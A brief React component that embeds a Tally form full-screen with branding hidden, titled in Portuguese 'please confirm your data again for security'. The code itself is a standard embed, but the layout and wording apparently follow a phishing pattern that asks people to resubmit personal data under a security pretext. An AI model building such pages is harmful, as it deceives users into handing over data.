import React, { useEffect } from 'react';

const FormPage = () => {
    useEffect(() => {
        const d = document;
        const w = "https://tally.so/widgets/embed.js";
        const v = () => {
            if (typeof Tally !== "undefined") {
                Tally.loadEmbeds();
            } else {
                d.querySelectorAll("iframe[data-tally-src]:not([src])").forEach((e) => {
                    e.src = e.dataset.tallySrc!;
                });
            }
        };
        if (typeof Tally !== "undefined") {
            v();
        } else if (d.querySelector(`script[src="${w}"]`) === null) {
            const s = d.createElement("script");
            s.src = w;
            s.onload = v;
            s.onerror = v;
            d.body.appendChild(s);
        }
    }, []);

    return (
        <div style={{ margin: 0, height: '100vh', overflow: 'hidden' }}>
            <iframe
                data-tally-src="https://tally.so/r/mVo5o6?transparentBackground=1&hideTitle=1&branding=0"
                width="100%"
                height="100%"
                frameBorder="0"
                marginHeight="0"
                marginWidth="0"
                title="POR FAVOR, CONFIRME SEUS DADOS NOVAMENTE POR SEGURANÇA."
                style={{
                    position: 'absolute',
                    top: 0,
                    right: 0,
                    bottom: 0,
                    left: 0,
                    border: 0,
                }}
            ></iframe>
        </div>
    );
};

export default FormPage;
